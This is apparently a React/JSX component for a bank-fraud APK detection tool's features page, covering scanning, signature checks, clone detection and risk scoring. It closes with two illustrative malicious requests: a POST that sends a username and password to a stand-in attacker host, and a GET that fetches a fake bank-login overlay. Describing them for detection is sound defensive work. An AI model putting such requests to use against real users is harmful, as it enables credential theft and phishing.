import Button from "./Button";

export default function Features(){
    return <div className="h-full p-1 space-y-1.5  text-white bg-[#08111b] ">
        
<h1 className="py-5 font-bold text-3xl text-yellow-300">    🔐 Features of the Bank Fraud APK Detecting System </h1>
<h2 className="text-blue-500 text-xl">1. APK Scanning and Analysis</h2>

<p>Deep scan of uploaded APK files.<br/>

Static and dynamic analysis of code and behavior.<br/>

Extracts permissions, activities, receivers, services, and metadata.</p>

<h2  className="text-blue-500 text-xl">2. Malware and Phishing Detection</h2>

<p>Detects known malware signatures.

Uses ML models or rule-based systems to flag suspicious behaviors (e.g., keylogging, SMS interception).<br/>

Identifies fake apps mimicking real banking applications.</p>

<h2 className="text-blue-500 text-xl">3. Certificate & Signature Verification</h2>

<p>Verifies developer certificates.<br/>

Detects tampered or re-signed APKs (often seen in fraud cases).</p>

<h2  className="text-blue-500 text-xl">4. Bank App Cloning Detection</h2>

<p>Identifies apps that copy icons, names, or UI elements of legitimate banks.<br/>

Compares against a database of trusted bank apps.</p>

<h2 className="text-blue-500 text-xl">5. Behavioral Heuristics</h2>

<p>Analyzes suspicious behavior like:<br/>

Overlay attacks<br/>

Accessibility abuse<br/>

Hidden permissions<br/>

Root/jailbreak checks</p>

<h2 className="text-blue-500 text-xl">6. Real-Time Threat Score</h2>

<p>Assigns a risk score to APKs based on suspicious features.<br/>

Visual indicators (e.g., low/medium/high risk levels).</p>

<h2 className="text-blue-500 text-xl">7. Database of Verified Bank Apps</h2>

<p>Maintains an up-to-date list of legitimate banking APKs.

Allows comparison for authenticity and tamper detection.</p>

<h2 className="text-blue-500 text-xl">8. User-Friendly Dashboard</h2>

<p>Easy-to-use web or mobile interface.

Upload APKs, view reports, and track previous scans.</p>

<h2  className="text-blue-500 text-xl">9. Report Generation</h2>

<p>Generates detailed reports on each scan:<br/>

Risk factors<br/>

Permissions<br/>

Code analysis<br/>

Recommendations</p>

<h2 className="text-blue-500 text-xl">✅ Example 1: Exfiltrating credentials<br/>

Request (POST):
</h2>
<p>POST http://malicious-host.com/api/collect_credentials HTTP/1.1<br/>
Content-Type: application/json<br/>
User-Agent: BankApp/1.1
<br/>

  "username": "john_doe",<br/>
  "password": "mypassword123",<br/>
  "bank": "FakeBank"<br/>

</p>
<h2 className="text-blue-500 text-xl">✅ Example 2: Overlay injection for fake login screen

Request (GET):</h2>
<p>GET http://maliciouscdn.com/layouts/xyzbank_overlay.html
</p>
</div>}